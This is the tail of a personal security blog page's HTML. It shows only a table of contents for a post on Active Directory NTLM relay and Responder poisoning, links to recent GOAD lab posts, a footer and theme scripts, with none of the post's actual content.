fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Responder%E6%8A%95%E6%AF%92"><span class="toc-number">1.</span> <span class="toc-text">Responder投毒</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTLM-%E4%B8%AD%E7%BB%A7"><span class="toc-number">2.</span> <span class="toc-text">NTLM 中继</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E7%AD%BE%E5%90%8D%E7%9A%84-SMB"><span class="toc-number">2.1.</span> <span class="toc-text">未签名的 SMB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E7%AE%A1%E7%90%86%E5%91%98%E5%B8%90%E6%88%B7%E8%BF%90%E8%A1%8C-SOCKS-%E4%B8%AD%E7%BB%A7"><span class="toc-number">2.2.</span> <span class="toc-text">使用管理员帐户运行 SOCKS 中继</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#secretsdump"><span class="toc-number">2.2.1.</span> <span class="toc-text">secretsdump</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Lsassy"><span class="toc-number">2.2.2.</span> <span class="toc-text">Lsassy</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SMBClient"><span class="toc-number">2.2.3.</span> <span class="toc-text">SMBClient</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SMBexec%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.2.4.</span> <span class="toc-text">SMBexec命令执行</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mitm6-Inveigh-ntlmrelayx-%E5%88%B0-LDAP"><span class="toc-number">3.</span> <span class="toc-text">Mitm6 &#x2F;Inveigh+ ntlmrelayx 到 LDAP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E5%88%B6%E8%AE%A4%E8%AF%81%E5%90%8Erelay%E5%88%B0ldap"><span class="toc-number">4.</span> <span class="toc-text">强制认证后relay到ldap</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/GOAD-Journey-Part3/" title="GOAD-Journey-Part3">GOAD-Journey-Part3</a><time datetime="2025-12-26T17:14:18.000Z" title="Created 2025-12-27 01:14:18">2025-12-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/GOAD-Journey-Part2/" title="GOAD-Journey-Part2">GOAD-Journey-Part2</a><time datetime="2025-12-22T14:38:10.000Z" title="Created 2025-12-22 22:38:10">2025-12-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/GOAD-Journey-Part1/" title="GOAD-Journey-Part1">GOAD-Journey-Part1</a><time datetime="2025-12-21T07:45:31.000Z" title="Created 2025-12-21 15:45:31">2025-12-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/GOAD-Wirteup-Part1/" title="GOAD-Wirteup_Part1(废弃)">GOAD-Wirteup_Part1(废弃)</a><time datetime="2025-12-20T12:06:26.000Z" title="Created 2025-12-20 20:06:26">2025-12-20</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By 3h1xy</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3"></script><script src="/js/main.js?v=5.5.3"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/click-show-text.min.js" data-mobile="false" data-text="Wireshark,Metasploit,Nmap,Burp Suite,Kali Linux,John the Ripper,Aircrack-ng,Nessus,Snort,SQLi,XSS,DDoS,Buffer Overflow,MITM,Zero-Day,Social Engineering,RAT,Password Spraying,Ransomware" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="local-search-input"><input placeholder="Search for Posts" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.3"></script></div></div></body></html>
